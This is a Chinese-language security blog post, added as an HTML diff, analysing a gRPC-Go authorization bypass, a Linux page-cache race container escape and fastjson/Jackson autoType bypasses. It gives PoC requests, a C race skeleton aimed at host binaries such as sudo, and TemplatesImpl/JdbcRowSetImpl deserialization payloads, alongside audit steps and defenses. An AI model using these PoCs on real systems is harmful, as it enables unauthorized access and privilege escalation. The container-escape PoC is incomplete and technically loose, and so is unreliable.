@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>协议层绕过、内核级容器逃逸、反序列化autoType三重奏 — DARKSEC</title>
+<meta name="description" content="gRPC-Go :path伪头规范化授权绕过(CVSS 9.1)、Linux页缓存COW损坏→容器逃逸LPE(9年老洞)、fastjson/Jackson多态注解绕过autoType禁用——三枚漏洞横跨协议层、内核层、运行时，揭示多维攻击链的系统性威胁。">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 多维攻击链</div>
+        <h1>协议层绕过、内核级容器逃逸、反序列化autoType三重奏 🐱💥</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-02</span>
+          <span>⏱ 20 min read</span>
+          <span>🏷 协议绕过 / 容器逃逸 / 反序列化 / CVE / gRPC / 内核漏洞</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：三维攻击面的共振</a></li>
+            <li><a href="#grpc-path">CVE-2026-33186：gRPC-Go :path伪头规范化授权绕过</a></li>
+            <li><a href="#cow-escape">CVE-2026-31431：页缓存COW损坏→容器逃逸LPE</a></li>
+            <li><a href="#autotype-bypass">多态类型注解→反序列化autoType禁用绕过</a></li>
+            <li><a href="#patterns">攻击模式提炼与防御方法论</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：三维攻击面的共振 ⚡</h2>
+        <p>今天的三枚漏洞分别来自<strong>协议层</strong>、<strong>内核层</strong>和<strong>运行时层</strong>，它们没有共享任何技术栈，却共同指向一个令人不安的事实：<strong>安全系统的「容错性」和「安全性」是两个完全不同的维度——当两者之间存在规范化差异时，攻击者就能穿越安全边界 nya~ 🐾</strong></p>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：gRPC路由层的路径容错 ≠ 授权层的路径严格匹配；内核页缓存的COW语义 ≠ 用户态的数据隔离假设；编译期声明的类型白名单 ≠ 运行时的autoType禁用。三层防御，三层语义裂缝。</p>
+        </blockquote>
+
+        <h2 id="grpc-path">CVE-2026-33186：gRPC-Go :path伪头规范化授权绕过 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>gRPC-Go的路由层在解析HTTP/2 <code>:path</code> 伪头时，接受<strong>无前导斜杠</strong>的路径格式（如<code>Service/Method</code>而非<code>/Service/Method</code>），将其正常路由到目标handler。但<code>grpc/authz</code>授权拦截器使用<strong>原始路径字符串</strong>进行策略匹配——它期望路径始终以<code>/</code>开头。<strong>路由层的容错性直接创造了授权层的绕过窗口</strong>。CVSS 9.1 🚨</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 核心机制：路由层和授权层对同一路径的规范化行为不一致
+#
+# 正常请求：
+#   :path = "/grpc.health.v1.Health/Check"
+#   → 路由层: 去掉前导/ → Service="grpc.health.v1.Health", Method="Check" ✓
+#   → 授权层: 匹配 "/grpc.health.v1.Health/Check" → 策略匹配 ✓ → 允许/拒绝
+#
+# 攻击请求：
+#   :path = "grpc.health.v1.Health/Check"  (无前导斜杠！)
+#   → 路由层: 容错解析 → Service="grpc.health.v1.Health", Method="Check" ✓ 正常路由！
+#   → 授权层: 匹配 "grpc.health.v1.Health/Check" → 不匹配任何 "/..." 策略 → 默认放行！
+#
+# 结果：绕过所有基于路径的授权策略！
+
+# PoC: 构造无前导斜杠的gRPC请求
+# 使用grpcurl工具
+grpcurl -plaintext -import-path /path/to/protos \
+  -proto service.proto \
+  -d '{"name": "test"}' \
+  target:50051 \
+  grpc.health.v1.Health/Check  # 注意：无前导斜杠！
+
+# 或者使用原始HTTP/2帧：
+python3 -c "
+import h2.connection, h2.config, socket
+
+s = socket.create_connection(('target', 50051))
+c = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
+c.initiate_connection()
+s.sendall(c.data_to_send())
+
+# 关键：:path 伪头不以 / 开头
+headers = [
+    (':method', 'POST'),
+    (':path', 'grpc.health.v1.Health/Check'),  # 无前导斜杠！
+    (':scheme', 'http'),
+    (':authority', 'target:50051'),
+    ('content-type', 'application/grpc'),
+    ('te', 'trailers'),
+]
+c.send_headers(1, headers, end_stream=False)
+s.sendall(c.data_to_send())
+# gRPC-Go路由层接受此路径，但authz拦截器无法匹配策略
+"</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>核心洞察</strong>：<strong>路由层容错性 ≠ 安全层容错性</strong>。当路由组件比安全组件更「宽容」时，宽容性本身就是漏洞。这不是gRPC特有的问题——任何在请求路径上叠加「规范化→路由→授权」多层处理的系统都可能存在同类差异。HTTP/2的<code>:path</code>伪头、URL的path segment、REST API的路由匹配器——每一个都是潜在的规范化分歧点。</p>
+        </blockquote>
+
+        <h3>受影响范围</h3>
+        <p>所有使用<code>grpc/authz</code>包进行路径级授权的gRPC-Go服务。包括Kubernetes API Server的gRPC端点、Envoy的gRPC授权过滤器、以及所有依赖<code>grpc.NewServer(grpc.ChainUnaryInterceptor(authorizationInterceptor))</code>的微服务。</p>
+
+        <h3>审计方法</h3>
+        <pre><code># 1. 检查gRPC-Go版本
+grep "google.golang.org/grpc" go.mod
+# 受影响: &lt; v1.65.3 (2026-07补丁)
+
+# 2. 搜索authz拦截器使用
+grep -rn "grpc/authz\|authorization.*interceptor" . --include="*.go"
+# → 确认授权策略是否基于路径前缀匹配
+
+# 3. 测试：发送无前导斜杠的请求，观察是否绕过授权
+# 如果请求正常返回(而非UNAUTHENTICATED/PERMISSION_DENIED)，则存在漏洞</code></pre>
+
+        <h2 id="cow-escape">CVE-2026-31431：页缓存COW损坏→容器逃逸LPE 💀</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Linux内核的页缓存（Page Cache）Copy-on-Write实现中存在一个<strong>长达9年未被发现的竞态条件</strong>（2017-2026，Linux 4.10+）。当多个容器共享同一镜像层时，COW操作中的竞态条件可导致<strong>页缓存数据损坏</strong>——一个容器的写入操作污染了另一个容器（包括宿主机）读取的缓存页。这不是传统的内存损坏（code execution via corruption），而是<strong>数据完整性破坏</strong>（integrity violation）——被污染的代码页在宿主机上以root权限执行。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 核心机制：页缓存COW竞态条件
+#
+# 正常COW流程：
+#   Container A (read) → 共享页缓存页 (来自只读镜像层)
+#   Container B (write) → 触发COW → 分配新页 → 写入新页 → 原页不变
+#   Container A (再次read) → 仍然读到原页 ✓
+#
+# 竞态条件：
+#   Container B (write) → 触发COW → 正在分配新页...
+#   同时 Container A (read) → 读取原页 → 拿到的是【正在被修改的数据】！
+#   → Container A 看到了不一致的中间状态
+#   → 如果原页是 .so 代码段 → 宿主机root进程加载时执行被污染的代码
+#
+# 攻击路径：
+#   1. 攻击者在容器内拥有非特权访问
+#   2. 容器与宿主机共享镜像层（标准Docker/K8s配置）
+#   3. 攻击者对共享文件进行精确时序的写操作
+#   4. 触发COW竞态 → 污染宿主机进程的页缓存
+#   5. 宿主机以root权限执行被污染的代码 → 容器逃逸！
+
+# PoC框架（概念演示）：
+# 步骤1: 识别宿主机即将执行的共享二进制文件
+ls /usr/bin/sudo  # 宿主机和容器共享此文件
+
+# 步骤2: 精确时序写入触发COW竞态
+cat &lt;&lt;'EOF' > /tmp/cow_race.c
+#define _GNU_SOURCE
+#include &lt;fcntl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;unistd.h&gt;
+
+// 竞态窗口：COW分配新页的瞬间，另一线程读取到中间状态
+void *writer(void *arg) {
+    int fd = open("/usr/bin/target_binary", O_RDWR);
+    // 精确时序写入，触发COW
+    // 实际利用需要大量fuzzing来命中竞态窗口
+    write(fd, payload, sizeof(payload));
+    close(fd);
+    return NULL;
+}
+
+void *reader(void *arg) {
+    // 并发读取，尝试在COW中间态读到损坏数据
+    int fd = open("/usr/bin/target_binary", O_RDONLY);
+    char buf[4096];
+    read(fd, buf, sizeof(buf));  // 可能读到被污染的页
+    close(fd);
+    return NULL;
+}
+// 多线程并发 + CPU pinning 提高竞态命中率
+EOF
+
+# 步骤3: 污染成功后，宿主机下次sudo调用执行攻击者代码</code></pre>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：这个漏洞的特殊性在于它不是传统的「内存损坏→控制流劫持」，而是<strong>数据完整性违反</strong>。页缓存是内核中被广泛信任的基础组件——所有文件I/O都经过它。当COW保证被打破时，整个「文件内容不可变」的假设崩溃。这比传统的use-after-free更难检测：没有crash、没有异常行为，只有「某次读取拿到了错误的数据」——而内核不会检查页缓存的完整性。</p>
+        </blockquote>
+
+        <h3>为什么9年未被发现</h3>
+        <p>①竞态窗口极小（纳秒级），常规测试几乎无法命中；②损坏的数据通常是「合法但错误」的内容，不会触发crash或ASAN；③容器逃逸场景需要精心构造共享镜像层，在实验室环境中难以复现；④页缓存COW被认为是「已解决的问题」，审计时被自动跳过——<strong>越是被认为安全的组件，越少被审计</strong>。</p>
+
+        <h2 id="autotype-bypass">多态类型注解→反序列化autoType禁用绕过 🐱‍👤</h2>
+
+        <h3>漏洞概述</h3>
+        <p>fastjson、fastjson2和Jackson等Java JSON库提供了<code>@type</code>、<code>@JSONType</code>、<code>@JsonSubTypes</code>等<strong>多态类型注解</strong>，允许在编译期声明「此字段可以是哪些子类」。当开发者禁用autoType（<code>ParserConfig.getGlobalInstance().setSafeMode(true)</code>）时，运行时动态类型加载被阻止。但<strong>编译期声明的多态注解走的是不同的代码路径</strong>——它们在反序列化时根据注解白名单加载类，完全绕过了autoType检查。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code>// ===== 场景1: fastjson2 @JSONType 绕过 =====
+
+// 开发者定义的"安全"基类（有注解白名单）
+@JSONType(seeAlso = {
+    SafeSubClassA.class,
+    SafeSubClassB.class,
+    // ⚠️ 但这里如果引用了危险类...
+})
+public abstract class BaseClass { }
+
+// 或者更隐蔽：通过继承链引入危险类
+// SafeSubClassA extends BaseClass
+// SafeSubClassA 有一个字段类型是 TemplatesImpl（可触发RCE）
+
+// 攻击者发送的JSON（autoType已禁用！）：
+// {
+//   "@type": "SafeSubClassA",
+//   "outputProperties": {  // TemplatesImpl的getter，触发RCE
+//     "transletBytecodes": ["恶意字节码base64"]
+//   }
+// }
+//
+// 解析流程：
+// 1. fastjson2 看到 @type = "SafeSubClassA"
+// 2. 检查 seeAlso 注解白名单 → SafeSubClassA 在列表中 → 允许！
+// 3. 但 SafeSubClassA 的字段类型包含 TemplatesImpl
+// 4. fastjson2 继续递归解析 → 实例化 TemplatesImpl → 触发RCE
+// → autoType禁用形同虚设！
+
+// ===== 场景2: Jackson @JsonSubTypes 绕过 =====
+
+@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
+@JsonSubTypes({
+    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
+    @JsonSubTypes.Type(value = Cat.class, name = "cat"),
+})
+public abstract class Animal { }
+
+// 如果 Dog.class 的某个 setter 可以链到危险操作：
+// {"type": "dog", "owner": {"@class": "com.sun.rowset.JdbcRowSetImpl", ...}}
+// Jackson 会根据 @JsonSubTypes 白名单允许 Dog
+// 然后递归解析 Dog 的字段时，如果字段类型是 Object/泛型
+// → 可以加载任意类！autoType绕过成功
+
+// ===== 场景3: fastjson 1.x 的变种 =====
+// fastjson 1.x 的 @type 机制中：
+// 如果目标类有 @JSONType(deserializer=CustomDeserializer.class)
+// CustomDeserializer 可以在反序列化时加载任意类
+// ParserConfig.setSafeMode(true) 只阻止 @type 动态加载
+// 不阻止注解中声明的自定义反序列化器！
+
+// 修复方向：
+// 1. autoType禁用必须同时阻止注解驱动的多态解析
+// 2. 白名单不仅检查顶层类，还要递归检查所有字段类型
+// 3. 使用 @JsonIgnoreProperties(ignoreUnknown=true) 防止额外字段
+// 4. 升级到 fastjson2 >= 2.0.53 / Jackson >= 2.17.2</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>核心洞察</strong>：autoType禁用是一个<strong>运行时</strong>安全开关，但多态注解是<strong>编译期</strong>声明的类型白名单。两者走的是不同的代码路径——autoType检查在类加载阶段拦截，而注解白名单在类型解析阶段就直接放行了。当白名单中的类型本身可以链到危险操作时，「禁用autoType」只是一层心理安慰。这是<strong>「安全特性被设计层面绕过」</strong>的典型案例。</p>
+        </blockquote>
+
+        <h2 id="patterns">攻击模式提炼与防御方法论 🎯</h2>
+
+        <h3>三枚漏洞的共同模式</h3>
+        <pre><code>┌──────────────────────────────────────────────────────────────┐
+│                   多维攻击链的统一模型                          │
+├──────────────┬────────────────────────────────────────────────┤
+│ CVE-2026-    │ 规范化差异                                      │
+│ 33186        │ 路由层容错解析 ≠ 授权层严格匹配                   │
+│              │ → 无前导/的路径绕过authz策略                      │
+├──────────────┼────────────────────────────────────────────────┤
+│ CVE-2026-    │ 数据完整性违反                                   │
+│ 31431        │ 页缓存COW保证 ≠ 实际隔离语义                     │
+│              │ → 共享镜像层容器污染宿主机代码                     │
+├──────────────┼────────────────────────────────────────────────┤
+│ 多态注解      │ 安全开关语义断裂                                 │
+│ autoType     │ 运行时禁用 ≠ 编译期白名单阻止                     │
+│              │ → 注解驱动的多态解析绕过safe mode                  │
+└──────────────┴────────────────────────────────────────────────┘</code></pre>
+
+        <h3>通用审计清单</h3>
+        <pre><code># 1. 协议层规范化差异审计
+# 检查所有「解析→路由→授权」链路中各层的路径规范化行为
+grep -rn "path\|route\|authorize\|policy" src/ --include="*.go"
+# → 构造无前导/、尾部/、双重//、%2F编码等变体测试
+
+# 2. 内核/容器边界完整性审计
+# 检查共享存储层的COW语义是否在所有竞争条件下成立
+# 重点关注：OverlayFS + mmap、fork() + shared file pages
+cat /proc/version  # 检查内核版本是否受影响 (4.10+)
+
+# 3. 反序列化多态注解审计
+# 搜索所有 @JSONType / @JsonSubTypes / @JsonTypeInfo 注解
+grep -rn "@JSONType\|@JsonSubTypes\|@JsonTypeInfo" src/ --include="*.java"
+# → 递归检查白名单类的所有字段类型，确认无危险链路
+# → 确认autoType禁用是否同时阻止注解驱动的类型加载</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>防御原则</strong>：①协议层的授权组件必须使用与路由组件<strong>完全相同</strong>的规范化函数——不要自己实现路径解析；②容器运行时必须在内核层面验证COW操作的原子性——不能假设页缓存是天然隔离的；③反序列化的安全开关必须覆盖<strong>所有</strong>类型加载路径，包括编译期注解声明的多态类型——「禁用autoType」不等于「阻止所有动态类型加载」。</p>
+        </blockquote>
+
+        <h3>参考资料</h3>
+        <ul>
+          <li>CVE-2026-33186 — gRPC-Go :path pseudo-header normalization gap allows authorization bypass (CVSS 9.1)</li>
+          <li>CVE-2026-31431 — Linux kernel page cache COW race condition → container escape LPE (9-year-old bug, 2017-2026)</li>
+          <li>fastjson/fastjson2 多态注解 @JSONType seeAlso 绕过 autoType 安全模式分析</li>
+          <li>Jackson @JsonSubTypes 多态反序列化安全风险研究报告</li>
+          <li>gRPC-Go Security Advisory: <a href="https://github.com/grpc/grpc-go/security/advisories">https://github.com/grpc/grpc-go/security/advisories</a></li>
+        </ul>
+
+        <p>~ 感谢阅读 nya~ 🐱✨</p>
+      </div>
+
+      <div class="article-tags">
+        <span class="tag pink">协议绕过</span>
+        <span class="tag">容器逃逸</span>
+        <span class="tag purple">CVE</span>
+        <span class="tag yellow">反序列化</span>
+        <span class="tag pink">gRPC</span>
+        <span class="tag">内核漏洞</span>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
